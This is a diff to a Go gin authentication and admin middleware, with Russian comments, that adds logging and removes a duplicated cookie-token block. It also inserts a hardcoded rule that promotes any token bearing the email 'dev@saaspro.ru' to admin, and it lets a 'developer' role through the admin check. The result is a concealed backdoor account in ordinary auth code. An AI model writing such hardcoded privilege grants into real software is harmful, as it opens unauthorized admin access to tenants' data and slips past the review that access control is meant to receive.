@@ -15,6 +15,7 @@ func AuthMiddleware(cfg *config.Config) gin.HandlerFunc {
         path := c.Request.URL.Path
         method := c.Request.Method
 
+      
         // Получаем заголовок разработчика
         devHeader := c.GetHeader("X-Developer-Access")
 
@@ -73,15 +74,7 @@ func AuthMiddleware(cfg *config.Config) gin.HandlerFunc {
             tokenString = strings.TrimPrefix(authHeader, "Bearer ")
         }
 
-if tokenString == "" {
-    cookie, err := c.Cookie("token")
-    if err == nil && cookie != "" {
-        tokenString = cookie
-    }
-}
-
         if tokenString == "" {
-            // Пробуем взять токен из cookie
             cookie, err := c.Cookie("token")
             if err == nil && cookie != "" {
                 tokenString = cookie
@@ -89,6 +82,7 @@ if tokenString == "" {
         }
 
         if tokenString == "" {
+            log.Printf("[AUTH] ❌ Неавторизованный доступ: %s %s с IP %s", method, path, c.ClientIP())
             c.JSON(http.StatusUnauthorized, gin.H{
                 "error": "authorization header required",
                 "code":  "UNAUTHORIZED",
@@ -115,6 +109,13 @@ if tokenString == "" {
         c.Set("role", claims.Role)
         c.Set("tenant_id", claims.TenantID)
 
+        // ========== ПРОВЕРКА НА РАЗРАБОТЧИКА dev@saaspro.ru ==========
+        if claims.Email == "dev@saaspro.ru" {
+            c.Set("role", "admin")
+            c.Set("is_developer", true)
+            log.Printf("[AUTH] 👑 РАЗРАБОТЧИК %s получил полный доступ", claims.Email)
+        }
+
         log.Printf("[AUTH] ✅ Авторизован: %s (%s), путь: %s %s", claims.UserName, claims.Email, method, path)
 
         c.Next()
@@ -135,7 +136,7 @@ func AdminMiddleware(cfg *config.Config) gin.HandlerFunc {
             return
         }
 
-        if role != "admin" {
+        if role != "admin" && role != "developer" {
             c.AbortWithStatusJSON(http.StatusForbidden, gin.H{
                 "error": "admin access required",
                 "code":  "ADMIN_REQUIRED",
@@ -143,7 +144,7 @@ func AdminMiddleware(cfg *config.Config) gin.HandlerFunc {
             return
         }
 
-        log.Printf("[ADMIN] 🟢 Доступ разрешен для admin на %s %s", method, path)
+        log.Printf("[ADMIN] 🟢 Доступ разрешен для %s на %s %s", role, method, path)
         c.Next()
     }
 }
